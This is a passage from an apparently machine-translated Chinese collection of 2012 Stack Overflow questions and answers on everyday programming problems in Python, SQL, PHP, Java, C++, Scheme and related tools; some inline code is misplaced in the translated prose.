        for line in read_file.readlines():
            # Replace the needed words
            line = line.replace('????', 'something')
            write_file.write(line) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:31:27.580

首先让我们创建一个函数，`something`如果给定一个长度为 4 的单词，则返回，否则返回：

```
def maybe_replace(word, length=4):
  if len(word) == length:
    return 'something'
  else:
    return word 
```

现在让我们来看看你的 for 循环。在每次迭代中，您都有一行原始文件。让我们把它分解成单词。Python 为我们提供了`split`我们可以使用的函数：

```
 split_line = line.split() 
```

默认是在空格上分割，这正是我们想要的。如果您需要，还有[更多文档。](http://docs.python.org/2/library/stdtypes.html#str.split)

现在我们想要获取`maybe_replace`在每个单词上调用我们的函数的列表：

```
 new_split_line = [maybe_replace(word) for word in split_line] 
```

[`join`现在我们可以使用以下方法](http://docs.python.org/2/library/stdtypes.html#str.join)将这些备份连接在一起：

```
 new_line = ' '.join(new_split_line) 
```

并将其写回我们的文件：

```
 o.write(new_line + '\n') 
```

所以我们的最终功能将是：

```
def replacement():  
  o = open("file.txt","a") #file.txt will be the file containing the changed phrase
  for line in open("y.txt"):  #y.txt is the original file
    split_line = line.split()
    new_split_line = [maybe_replace(word) for word in split_line]
    new_line = ' '.join(new_split_line)
    o.write(new_line + '\n')
  o.close() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T19:22:42.970

这将保留您拥有的额外空间，因为使用的其他解决方案`str.split()`不会。

```
import re

exp = re.compile(r'\b(\w{4})\b')
replaceWord = 'stuff'
with open('infile.txt','r') as inF, open('outfile.txt','w') as outF:
    for line in inF:
        outF.write(exp.sub(replaceWord,line)) 
```

这使用正则表达式来替换文本。这里使用的正则表达式有三个主要部分。第一个匹配单词的开头：

```
\b 
```

第二部分完全匹配四个字母（所有字母数字字符和`_`）：

```
(\w{4}) 
```

最后一部分和第一部分一样，它匹配一个单词的结尾

```
\b 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:27:51.303

这似乎是家庭作业，所以这里有一些关键概念。

当你读取一个文件时，你会`lines`得到`strings`. 您可以使用名为 的字符串方法将a 拆分`line`为 a ，就像这样。 . 这将创建一个单词列表。 `list``.split()``words = line.split()`

现在， a`list`是*可迭代*的，这意味着您可以在其上使用 for 循环，并一次对其中的一项进行操作`list`。你想检查它有多长`word`，所以你必须迭代`words`你的循环，并用它做一些事情。您已经接近弄清楚如何使用`len(word)`.

您还需要一个地方来存储您的最终信息。在循环之外，您需要创建一个`list`for 结果，以及`.append()`您在进行过程中检查过的单词。

最后，您需要对`line`文件中的每个都执行此操作，这意味着*第二个*for 循环遍历文件。

# sql-server-2008 - 如何更改包内的查询以使用作业的最后执行日期时间？

> ID：13313781
> 
> 赞同：0
> 
> 时间：2012-11-09T18:21:46.177
> 
> 标签：sql-server-2008, ssis

我有一个日常工作，它运行一个 SSIS 包，以使用日期范围从表中选择前一天的记录数。我想将其更改为每隔几分钟运行一次，因此我需要将上一次运行查询中使用的日期时间保存到我想存储在另一个数据库表中的变量中。有人建议我使用 IO 存储它，但不确定它们是什么意思。

```
SELECT [authorUrl],[postDate] ,[dateadded]
FROM [Feeds].[dbo].[XMLFeed]
where CONVERT(DATE, DateAdded) = DATEADD(DAY, -1, CONVERT(DATE, SYSDATETIME()))
order by dateadded desc 
```

如何将 where 语句更改为 date added 等于或大于上次运行此选择的位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:31:33.057

您必须将最后一个执行值存储在某处的表中。首先，创建一个表来保存您最后的执行参数：

```
create table LastExecutionParameters
(
  Id int identity(1,1) not null,
  LastExecutionDate datetime
) 
```

然后，以这种方式使用它：

```
declare @executionDate datetime = 
    (select top 1 DateAdd(Day, 1, LastExecutionDate) 
       from LastExecutionParameters 
      order by Id desc);

SELECT [authorUrl],[postDate] ,[dateadded]
FROM [Feeds].[dbo].[XMLFeed]
where CONVERT(DATE, DateAdded) = DATEADD(DAY, -1, @executionDate)
order by dateadded desc

insert into LastExecutionParameters values (@executionDate); 
```

当然，更改`dateadd`呼叫以满足您的需求。

# php - 使用 Prestashop 的后台将一个项目关联到多个其他项目（不同类别的）

> ID：13313782
> 
> 赞同：0
> 
> 时间：2012-11-09T18:21:46.763
> 
> 标签：php, model-view-controller, prestashop

刚刚到达 Prestashop 1.5，我正在制作一个非常简单的模块：一周的视频，与需要出现在它旁边的多个产品相关联。

我决定从后台开始。现在，我可以查看、添加、编辑和删除所有视频条目，但我对如何映射视频及其相关产品之间的 NN 关联有点迷茫……缺乏文档也无济于事。

任何想法如何解决这个问题？

这是我的一些代码， Video 类由以下内容定义：

```
class Video extends ObjectModel {

    public $id_video;
    public $title;
    public $url;
    public $active;

    public static $definition = array(
        'table'     => 'video',
        'primary'   => 'id_video',
        'multilang' => false,
        'fields' => array(
            'id_video' => array(
                'type' => ObjectModel :: TYPE_INT
            ),
            'title' => array(
                'type' => ObjectModel :: TYPE_STRING, 
                'required' => true
            ),
            'url' => array(
                'type' => ObjectModel :: TYPE_STRING, 
                'required' => true
            ), 
            'active' => array(
                'type'      => ObjectModel :: TYPE_BOOL, 
                'required'  => true
            )
        ),
    );

(...) 
```

和 AdminVideo 类在这里：

```
class AdminVideoController extends ModuleAdminController {

    public function __construct()
    {
        $this->table = 'video';
        $this->className = 'Video';
        $this->lang = false;

        $this->fields_list['id_video'] = array(
            'title' => $this->l('ID'),
            'align' => 'center',
        );

        $this->fields_list['title'] = array(
            'title' => $this->l('Title'),
            'width' => 'auto'
        );

        $this->fields_list['url'] = array(
            'title' => $this->l('URL'),
            'width' => 'auto'
        );

        $this->fields_list['active'] = array(
            'title' => $this->l('Active'),
            'width' => '70',
            'align' => 'center',
            'active' => 'status',
            'type' => 'bool',
            'orderby' => false
        );

        parent::__construct();
    }

    public function postProcess()
    {
         parent::postProcess();
    }

    public function renderList()
    {
        $this->addRowAction('edit');
        $this->addRowAction('delete');
        $this->addRowAction('details');

        return parent::renderList();
    }

    public function renderForm()
    {
        if (!($obj = $this->loadObject(true)))
            return;

        $this->fields_form = array(
            'legend' => array(
                'title' => $this->l('This weeks video'),
                'image' => '../img/admin/world.gif'
            ),
            'input' => array(
                array(
                    'type' => 'text',
                    'label' => $this->l('Nome'),
                    'name' => 'title',
                    'size' => 33,
                    'required' => true,
                    'desc' => $this->l('Title')
                ),
                array(
                      'type' => 'text',
                      'label' => $this->l('URL'),
                      'name' => 'url',
                      'size' => 33,
                      'required' => true,
                      'desc' => $this->l('Video URL')
                ),
                array(
                    'type' => 'radio',
                    'label' => $this->l('Active:'),
                    'name' => 'active',
                    'required' => false,
                    'class' => 't',
                    'is_bool' => true,
                    'values' => array(
                        array(
                            'id' => 'active_on',
                            'value' => 1,
                            'label' => $this->l('Enabled')
                        ),
                        array(
                            'id' => 'active_off',
                            'value' => 0,
                            'label' => $this->l('Disabled')
                        )
                    ),
                    'desc' => $this->l('Only one video can be active at any given time')
                ),
            )
        );

        if (Shop::isFeatureActive())
        {
            $this->fields_form['input'][] = array(
                'type' => 'shop',
                'label' => $this->l('Shop association:'),
                'name' => 'checkBoxShopAsso',
            );
        }

        $this->fields_form['submit'] = array(
            'title' => $this->l('   Save   '),
            'class' => 'button'
        );

        if (!($obj = $this->loadObject(true)))
            return;

        return parent::renderForm();
    }
  } 
```

另一件事：是否可以在后台添加视频预览？我试图回应 YouTube 的嵌入代码，但它甚至在标题之前就被插入了。有没有一种干净的方法可以做到这一点，还是我必须使用一些 jQuery 技巧？我基本上是在 postProcess() 结束之前对 YT 的嵌入代码做一个回显。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T20:52:08.720

将视频与产品相关联的最简单方法是在“视频”表中添加“产品”文本字段，以存储关联产品 ID 的逗号分隔列表（例如：1、10、27）。即使它有点初级，它也应该工作。
或者，您可以使用这样的表：

```
create table video_product (
  id_association int not null auto_increment,
  id_video int,
  id_product int,
  primary key (id_association)
); 
```

这个解决方案的问题是 PrestaShop ObjectModel 核心没有提供任何自动更新或删除相关表的方法（至少据我所知），所以你必须插入代码来管理你的“video_product”表“视频”课。
如果您想要一个如何执行此操作的示例，您应该查看`classes/Product.php`脚本，该脚本管理产品表及其所有相关表（类别、标签、功能、附件等）。
要了解 Prestashop 数据库的结构，请查看`docs/dbmodel.mwb`包含数据库架构的文件；可以使用[MySQL Workbench](http://www.mysql.com/products/workbench/)应用程序查看此文件。

# android - 程序每次执行都会生成相同的“随机”数

> ID：13313785
> 
> 赞同：3
> 
> 时间：2012-11-09T18:22:05.827
> 
> 标签：android, c++, random, noise-generator

我正在尝试使用 c4droid IDE 为 Android 终端编写一个带有随机生成世界的简单 ASCII 风格游戏。它具有 C++ 支持，基本上我正在`array[width][height]`使用规则`rand()%2 - 1`生成瓷砖，创建可行走的瓷砖，`0`是墙壁。但是有问题。每次我“随机”生成地图时，它看起来都是一样的——因为`rand()`并不是真正随机的。我听说过使用 HDD 或其他部件创建的熵。问题是我在 android 上使用它，所以我实现起来很奇怪，因为 C++ 不像 Java 那样被使用，所以我在谷歌上找不到解决方案。这么短的问题：如何在 android 上使用 c++ 生成“非常真实”的随机数？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-09T18:24:52.903

您需要使用`srand(time(NULL))`. 这允许计算机使用系统时间来计算伪随机数。

参考链接：[http ://www.cplusplus.com/reference/clibrary/cstdlib/srand/](http://www.cplusplus.com/reference/clibrary/cstdlib/srand/)

编辑：注意您只需要为 rand() 函数播种一次可能是明智的，通常是在程序的开头。

```
int main()
{
 srand(time(NULL)) //only needed to be called ONCE
 //code and rand functions afterward
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T18:26:06.813

我认为 rand() 应该适用于您正在做的事情。你在播种随机数生成器吗？

```
srand(time(NULL));
// Should be a different set of numbers each time you run.   
for(unsigned i = 0; i < 10; ++i) {
    cout << rand() % 2 - 1;    
} 
```

# php - gz压缩或纯字符串

> ID：13313799
> 
> 赞同：0
> 
> 时间：2012-11-09T18:23:51.890
> 
> 标签：php, compression

我有一个略大于`plain.cache`10MB 的文件，我从原始文件中制作了一个[gzcompressed](http://php.net/manual/en/function.gzcompress.php)文件。然后，我制作了两个单独的文件来加载每个提到的缓存文件，并且有点惊讶这两个文件的页面加载速度[几乎相同](http://whichloadsfaster.com/?l=nikola-breznjak.com/_testings/plain.php&r=nikola-breznjak.com/_testings/gz.php)。所以，我的问题是——我是否认为该文件不会以任何方式有利于页面的加载速度是正确的？现在，我会得出结论，我在文件中使用的[gzuncompress](http://php.net/manual/en/function.gzuncompress.php) “制作”了与我从纯文件中读取它时完全相同的字符串。鉴于所有这些陈述 - 一个普遍的问题是我如何（如果全部以这种方式完成）通过压缩文件来提高加载速度。`gz.cache``plain.cache``gzcompressed``gz.php``gzcompress`

文件图片如下，文件代码如下：

_makeCache.php，我在其中制作了 plain.cache 文件的 gzcompressed 版本：

```
$str = file_get_contents("plain.cache");
$strCompressed = gzcompress($str, 9);

$file = "gz.cache";
$fp = fopen($file, "w");

fwrite($fp, $strCompressed);
fclose($fp); 
```

普通的.php：

```
echo file_get_contents("plain.cache"); 
```

gz.php：

```
echo gzuncompress(file_get_contents("plain.cache")); 
```

![在此处输入图像描述](../Images/dccf9a6dfd7b4c7521969c9047ad46fd.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T05:03:28.547

您的 http 服务器正在使用 gzip 即时自动压缩 plain.cache，然后客户端将其解压缩。所以你应该看到几乎没有区别。

# python - 在格式字符串中的字典查找中使用变量作为键

> ID：13313802
> 
> 赞同：3
> 
> 时间：2012-11-09T18:23:58.520
> 
> 标签：python

我知道可以执行以下操作

```
d = {}
d['foo'] = 'bar'
print("foo: {d[foo]}".format(**vars()))
foo: bar 
```

但我无法完成以下任务

```
d = {}
key = 'foo'
d[key] = 'bar'
print("{key}: {d[key]}".format(**vars()))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'key' 
```

我期待输出“foo：bar”有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:48:57.307

看起来这在作为 python 标准库的一部分的模板中是不可能的。如果您使用 jinja，下面的代码就是实现您想要的代码之一。

```
from jinja2 import Template
t = '{% set lookup = d[key] %} {{key}} {{lookup}}'
print Template(t).render(**vars()) 
```

**输出**

```
foo bar 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:38:50.597

看看 Joran 的回答，以及 DSM 对它的评论：您可以应用基本的技巧来获得一个不太健壮的系统。如果你想稳健地做这种事情，你需要使用一个专门用来处理它的模板系统。

Jinja 2 就是其中之一（jinja.pocoo.org/）。谷歌揭示了更多：[https ://www.google.com/search?q=python+template](https://www.google.com/search?q=python+templating)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:34:18.450

```
 "*key*: {d[*key*]}".replace("*key*",key).format(**vars()) 
```

也许 ...

（编辑：将星号添加到键中以使其不太可能替换猴子：P）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:37:50.637

像这样的东西有效，但有点难看：

```
print("{key}: {}".format(eval("{d}['{key}']".format(**vars())), **vars())) 
```

输出：

```
foo: bar 
```

# logging - logback：用于登录网站的附加程序？

> ID：13313803
> 
> 赞同：0
> 
> 时间：2012-11-09T18:24:04.307
> 
> 标签：logging, spring-mvc, web, slf4j, logback

我在*Spring Web MVC*项目中使用 slf4j + Logback。除了使用“ConsoleAppender”登录到标准输出之外，我还想在网页上看到相同的日志（想想我的*Spring Web MVC*项目中的一个管理区域。是否已经有这种*查看你的日志作为 HTML*可用于 Logback 的实现？

按需生成日志网站会很棒，回退到静态 HTML 也可以。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T20:12:49.837

我想你有几个关于 Logback 的选择。这与我不久前与之抗争的场景相同。

*   **DBAppender**记录到数据库表（MySQL、Oracle 等）并编写一些**后端**代码（**PHP/JAVA**）来获取表。您还可以查看**PHP 模板引擎**（例如 TinyButStrong），它提供了访问数据库以呈现视图（html）的非常简单的方法 - [http://logback.qos.ch/manual/appenders.html](http://logback.qos.ch/manual/appenders.html)

*   根据我的痛苦经历，我已经说服我的团队将**Splunk**用于记录目的。这是一个了不起的工具，并且易于设置，无需上述开销。它为您的所有日志记录/监控目的提供了一个 Web 界面。所以......你不是自己建造的。他们每天有**500mb 的**免费许可证。这并不多，但值得。[http://docs.splunk.com/Documentation/Splunk](http://docs.splunk.com/Documentation/Splunk) 安装 Splunk - [http://www.youtube.com/watch?v=ogS4QEOrYW8](http://www.youtube.com/watch?v=ogS4QEOrYW8)

我建议你先试试 Splunk。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T22:48:27.033

只是为了增加 Splunk 的答案，有 LogBack Appenders 用于直接向 Splunk 发送事件：[https ://github.com/damiendallimore/SplunkJavaLogging](https://github.com/damiendallimore/SplunkJavaLogging)

# jsf-2 - 在 JSF 扩展数据表中选择图像时切换

> ID：13313811
> 
> 赞同：0
> 
> 时间：2012-11-09T18:24:35.210
> 
> 标签：jsf-2, richfaces

我正在尝试根据是否在扩展数据表中选择了行来获取图像来回交换。我能够以非活动状态显示图像，但不知道如何切换它。这是表定义代码：

```
<rich:extendedDataTable style="width: 800px; height: 150px;" 
rowClasses="Row0,Row1" value="#{myBean.exceptions}" var="exception"
selectionMode="single" id="Table" selection="#{myBean.exceptionSelection}">
<a4j:ajax event="selectionchange" listener="#{myBean.rowListener}" render=""/> 
```

这是我要切换其图像的列。想法是在同一目录中更改为名为filledRadioButton 的图像：

```
<rich:column id="selected_col" label="Selection">
<f:facet name="header">
<a4j:commandLink value="Selection" render="table"/>
</f:facet>
<h:graphicImage value="../resources/img/emptyRadioButton.jpg"/>
</rich:column> 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-10T05:09:39.327

您可以使用 dataTable 的`ajaxKeys`属性来专门引用一行（或多行）以进行 ajax 更新。所以要实现这一点：

1.  `ajaxKeys`将数据表的属性绑定到`Set<Integer>`支持 bean 中的 a。该集合将保存唯一的`id`类型值，这些值将引用数据表中的特定实体，以在 ajax 响应中更新。

2.  将您希望通过 ajax 更新的`id`属性添加到您的. 将图像的值设置为动态表达式，以便您可以在支持 bean 中将其切换出来`<h:graphicImage/>``render``<a4j:ajax/>`

    ```
     <a4j:ajax event="selectionchange" listener="#{myBean.rowListener}" render="indicatorImg"/>        
     <h:graphicImage id="indicatorImg" value="#{myBean.desiredImagePath}"/> 
    ```

3.  连接您的 ajax 侦听器以将所选实体的 id 添加到`ajaxKeys`Set 并`desiredImagePath`根据您认为合适的方式修改属性。

    ```
    public void rowListener(AjaxBehaviourEvent evt){
    //I assume you're already managing your selection properly
    //Change the value of the desiredImagePath here too.
     ajaxKeysSet.add(mySelection.getId()); //if you want to update multiple rows
            OR
     ajaxKeysSet = Collections.singleton(mySelection.getId()); //save a single id for ajax update
    } 
    ```

# java - 如何查找字符串中的单词数 - JAVA

> ID：13313813
> 
> 赞同：-3
> 
> 时间：2012-11-09T18:24:39.707
> 
> 标签：java, string, loops

如何在不使用 Java 循环的情况下找到字符串中的单词数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:27:14.067

如果要避免循环，则必须使用递归。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:29:23.030

尝试这样的事情：

```
int words = new java.util.StringTokenizer(myString," ").countTokens(); 
```

没试过是否有效，但应该。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T20:02:09.960

试试这个。这里绝对没有循环（假设`String.length`不迭代`String.substring`也不复制），甚至在幕后也没有，当然除了打印。

```
 static int nSpaces ( String s ) {
    int n = 0;
    if ( s.length() > 0 ) {
      if ( s.length() > 1 ) {
        // Split it in half.
        int center = s.length() / 2;
        // Count each half.
        n += nSpaces(s.substring(0, center))
           + nSpaces(s.substring(center));
      } else {
        // Just 1 character.
        if ( s.charAt(0) == ' ' ) {
          // It's a space.
          n += 1;
        }
      }
    }
    //System.out.println(n+" spaces in '"+s+"'");
    return n;
  }

  static int nWords ( String s ) {
    return nSpaces (s) + 1;
  }

  public static void main(String args[]) {
    String test = "Now is the time for all good men to come to the aid of the party.";
    System.out.println("nWords(\""+test+"\") = "+nWords(test));
  } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:26:07.063

1）您可以使用`split`, 然后获取结果数组的长度，但这会将任何非空格（例如数字）计为单词
2） [使用正则表达式匹配](https://stackoverflow.com/questions/4593565/regular-expression-for-accurate-word-count-using-javascript)空格之间的任何内容（您可以调整任何内容）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-09T18:28:26.950

1.  您可以拆分字符串以获取所有单词。
2.  应用过滤器/正则表达式来删除不必要的标点符号、字符等。
3.  然后将完整的数组放入一个集合中以获得唯一的单词。

在上述每个步骤中，您都可以获得您正在寻找的答案，了解您的要求如何使用单词（唯一或重复）

# php - 另一个 Codeigniter 属性未定义问题

> ID：13313814
> 
> 赞同：0
> 
> 时间：2012-11-09T18:24:41.607
> 
> 标签：php, codeigniter-2

我得到了这个，但我不明白为什么。：

```
A PHP Error was encountered

Severity: Notice
Message: Undefined property: Menu::$menu_model
Filename: controllers/menu.php
Line Number: 16

Fatal error: Call to a member function get_menu() on a non-object in /home/.../modules/menu/controllers/menu.php on line 16 
```

我看过[这个](https://stackoverflow.com/questions/9923160/codeigniter-model-undefined-property)，[那个](https://stackoverflow.com/questions/5547912/codeigniter-undefined-property-error-on-model)和[另一个](https://stackoverflow.com/questions/8440226/codeigniter-undefined-property-when-loading-a-model)。但即使使用我的简单代码，它仍然会中断。

控制器

```
class Menu extends CI_Controller
{
    /**
     * Constructor method
     */
    public function __construct()
    {
        parent::__construct();
    }

    function index($layout = -1)
    {
        $this->load->model('menu_model');
        // There is no $this->menu_model at this point. If I echo it out, it says property undefined as well.
        $data['menu'] = $this->menu_model->get_menu($layout);  // It fails on this line.
        $data['thisurl'] = $this->uri->uri_string();
        $this->load->view('menu.php');
    }

} 
```

该模型

```
class Menu_model extends CI_Model 
{
    public function get_menu($layout = -1)
    {
        $menu = array(
            0 => array('href' => '/', 'label' => 'Home', FALSE),
            1 => array('href' => '/about', 'label' => 'About', FALSE),
            2 => array('href' => '/help', 'label' => 'Help', FALSE)
        );

        return $menu;
    }
} 
```

文件加载成功。如果我将类名更改为 Menu_model_fail... 我会收到一个错误，如果我更改 load->model('menu_model_break') 我也会收到一个错误。所以我知道它正在正确加载文件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:33:20.053

看起来您正在使用 MX 模块化扩展 - 您应该将控制器更改为从 MX_Controller 而不是 CI_Controller 扩展。

# scheme - 方案 - 将布尔值转换为字符串？

> ID：13313815
> 
> 赞同：4
> 
> 时间：2012-11-09T18:24:41.310
> 
> 标签：scheme, boolean, racket

我很难找到在 Scheme 中将布尔值转换为字符串的示例。

我的问题是我使用 string-append 将几个字符串添加在一起作为调试器的一部分。我的解决方法是检查是否等于#t，然后附加“#t”，并与#f 类似。

我的问题-Scheme 中是否有将布尔值转换为字符串的方法？像 bool->string 这样的东西？

我的代码：

```
(if (equal? val #t)
                       (string-append (number->string count) ":" "#t")    
                       (string-append (number->string count) ":" "#f")    ) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:29:03.437

这可能会帮助您：

```
(define (->string x)
  (call-with-output-string
   (lambda (out)
     (display x out)))) 
```

这会将*任何*对象写入字符串端口并返回其字符串值。

```
> (->string #t)
"#t"
> (->string #f)
"#f" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T18:35:28.927

```
(define (boolean-to-string val) (if val "#t" "#f"))

(string-append (number->string count) ":" (boolean-to-string val)) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-09T19:04:17.370

使用`format`：

```
> (format "~a" #t)
"#t"
> (format "~a" #f)
"#f" 
```

# mysql - 什么是正确的 SQL 查询

> ID：13313816
> 
> 赞同：2
> 
> 时间：2012-11-09T18:24:45.900
> 
> 标签：mysql, sql

mysql数据库的脚本如下：

```
Create Table Aircraft
(
    aid integer not null,
    aname nchar(30) not null,
    cruisingrange integer not null,
    primary key (aid)   
);

Create Table Flights
(
    flNo integer not null,
    flFrom nchar(20)not null,
    flTo nchar(20) not null,
    distance integer not null,
    departs time not null,
    arrives time not null,
    price Decimal(6,2) not null,
    primary key(flNo)
);

create table Pilots
(
    pid integer not null,
    pname nchar(20) not null,
    salary Decimal(6,2) not null,
    primary key(pid)
);

create table certified
(
    pid integer not null,
    aid integer not null,
    primary key(pid,aid),
    foreign key(pid) references Pilots(pid)  ON DELETE CASCADE,
    foreign key(aid) references Aircraft(aid) ON DELETE CASCADE
);

INSERT INTO Aircraft(aid,aname,cruisingrange)
VALUES
(1, 'B-450',10000),
(2, 'C-190',4000),
(3, 'RN-110',5000),
(4, 'kp-30',2000),
(5, 'sh-60',1500),
(6, 'mr-70',7000),
(7, 'VK-20',3500);

INSERT INTO Flights(flNo,flFrom,flTo,distance,departs,arrives,price)
VALUES
(100,'city1','city2',1200,'16:00:00','16:30:00',130),
(110,'city3','city4',1000,'18:00:00','19:00:00',160),
(112,'city5','city6',2000,'15:00:00','16:00:00',185),
(115,'city7','city8',4000,'14:00:00','16:00:00',250),
(118,'city9','city3',1500,'18:00:00','19:00:00',220),
(119,'city2','city3',2500,'20:00:00','21:30:00',180);

INSERT INTO Pilots(pid,pname,salary)
VALUES
(400,'jack',150),
(410,'pit',180),
(420,'nami',200),
(430,'rafel',110),
(440,'linda',300);

INSERT INTO Certified(pid,aid)
VALUES 
(400,1),
(400,6),
(410,1),
(420,1),
(420,3),
(420,7),
(440,4),
(440,6); 
```

我想查询所有飞行员认证的薪水超过 187 美元的飞机的名称。事实上，那个“ALL”是我的问题！谁能帮帮我？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:28:30.850

您可以将问题改写为找到认证飞行员最低工资至少为 187 美元的飞机。

这很容易转换为 SQL：

```
SELECT aid
FROM ... all your joins here ...
GROUP BY aid
HAVING MIN(salary) >= 187 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:40:35.183

我会先对那些拥有您正在寻找的 187 美元的飞行员进行预查询，然后找到他们获得认证的飞机......

```
select
      QualifiedPilots.*,
      A.AName,
      A.CruisingRange
   from
      ( select 
              P.*
           from
              Pilots P
           where
              P.Salary >= 187 ) as QualifiedPilots
         JOIN Certified C
            on QualifiedPilots.pid = C.pid
            JOIN Aircraft A
               on C.aid = A.aid 
```

由于问题和您对您想要的内容的评论含糊不清，我已经修改为在每个飞行员的基础上包含一个 group_concat。

```
select
      QualifiedPilots.*,
      group_concat( A.AName ) CertAircraft
   from
      ( select 
              P.*
           from
              Pilots P
           where
              P.Salary >= 187 ) as QualifiedPilots
         JOIN Certified C
            on QualifiedPilots.pid = C.pid
            JOIN Aircraft A
               on C.aid = A.aid
   group by
      QualifiedPilots.pid 
```

此结果仅显示 2 名飞行员……显示飞行员“nami”获得了 3 架飞机的认证，而“linda”获得了 2 架飞机的认证……总共 5 个合格的认证，这是第一个查询返回的……只是名称相同多次，但显示飞机细节。

# google-apps-script - Google Apps 脚本 - 作为提交表单数据的用户发送电子邮件

> ID：13313817
> 
> 赞同：1
> 
> 时间：2012-11-09T18:24:49.137
> 
> 标签：google-apps-script

使用 Google Apps for business，我有一个公司用户可以在 google 网站上访问的表单。用户填写表格并提交。onSubmit，一个脚本运行，收集数据并放入 PDF 并发送电子邮件给我以供审查。

现在，当发送电子邮件时，它会在我发送给我时进入我的收件箱。我想让它在用户提交表单时发送。任何人都可以指出我在用户提交表单时发送的方向。

权限设置如下：

电子表格共享选项让公司的任何人都可以找到/查看。它被部署为“将应用程序执行为：”用户访问网络应用程序。公司的任何人都可以访问该应用程序。

想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:54:14.747

您可以将表单替换为以用户身份运行的 HtmlService 或 UiApp 版本，然后电子邮件将来自他们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-10T18:24:33.140

假设您使用的是 Google 表单，我不相信正在运行 onSubmit 的函数/脚本是由填写表单的用户运行的，它是由脚本的所有者（您）运行的。正如@Corey G 所说，您可以使用 HtmlService 或 UIApp 创建表单，但创建表单本身需要更多时间。

# git - Grails 和 .gitigore

> ID：13313818
> 
> 赞同：1
> 
> 时间：2012-11-09T18:24:50.913
> 
> 标签：git, grails, version-control

我刚开始进行 grails 开发，想知道应该在 .gitignore 文件中忽略哪些文件。到目前为止，我的 .gitignore 看起来像这样：

```
*.iws
*Db.properties
*Db.script
.settings
.link_to_grails_plugins
stacktrace.log
/*.zip
/plugin.xml
/*.log
/*DB.*
/cobertura.ser
.DS_Store
/target/
/out/
/web-app/plugins
/web-app/WEB-INF/classes# 
```

我目前正在使用来自 springsource 的 STS 作为我的 IDE。我无法弄清楚的唯一项目是“.classpath”文件和“target-eclipse”目录。我也应该将这两项放在 .gitignore 文件中吗？

也许有人可以帮助我解决这个问题......

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:30:52.863

“target-eclipse”和“target”（如果你从控制台运行）应该被忽略。这是编译的类所在的位置。

我还建议忽略“.classpath”，因为您可以使用它来生成它，但[无论您是否应该](https://stackoverflow.com/questions/3611728/java-project-should-classpath-project-file-be-committed-into-repository)`grails integrate-with --eclipse`这样做，这是一个很大的讨论

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T19:38:35.800

查看[Grails.gitignore](https://github.com/github/gitignore/blob/master/Grails.gitignore)，它是用于各种环境的大量 gitignore 文件集合的一部分。

# java - 应用程序升级引发 NPE

> ID：13313833
> 
> 赞同：2
> 
> 时间：2012-11-09T18:26:21.630
> 
> 标签：java, jnlp, java-web-start

我正在使用 JarDiff+Pack200+Signed app/jars

我有需要 j2se 版本=1.6.0_16 的应用程序 v1.0 在第一次安装/下载后，我部署了需要 j2se 版本=1.7+ 的 v2.0

随机 jar 升级失败，出现空指针异常第二次尝试启动 v2 总是成功的。

我已经使用 java 1.6.0_16 和 7u7 从命令行对其进行了测试。任何想法是什么意思？

```
java.lang.NullPointerException
at com.sun.deploy.net.DownloadEngine.applyPatch(Unknown Source)
at com.sun.deploy.cache.CacheEntry.processTempDataFile(Unknown Source)
at com.sun.deploy.cache.Cache.downloadResourceToTempFile(Unknown Source)
at com.sun.deploy.cache.Cache.downloadResourceToCache(Unknown Source)
at com.sun.deploy.net.DownloadEngine.actionDownload(Unknown Source)
at com.sun.deploy.net.DownloadEngine._downloadCacheEntry(Unknown Source)
at com.sun.deploy.cache.ResourceProviderImpl.getResourceCacheEntry(Unknown Source)
at com.sun.deploy.cache.ResourceProviderImpl.getResourceCacheEntry(Unknown Source)
at com.sun.deploy.cache.ResourceProviderImpl.getResource(Unknown Source)
at com.sun.javaws.LaunchDownload$DownloadTask.call(Unknown Source)
at java.util.concurrent.FutureTask$Sync.innerRun(Unknown Source)
at java.util.concurrent.FutureTask.run(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
at java.lang.Thread.run(Unknown Source) 
```

# c++ - 如何使用在运行时定义的数学函数创建一个类？

> ID：13313841
> 
> 赞同：-2
> 
> 时间：2012-11-09T18:26:57.463
> 
> 标签：c++, string, math

> **可能重复：**
> [是否有任何类型的“表达式类”（C++）](https://stackoverflow.com/questions/978247/is-there-any-kind-of-expression-class-c)

我想创建一个包含在运行时定义的函数的类。IE

```
function function1("x*sin(3.141*x)"); 
```

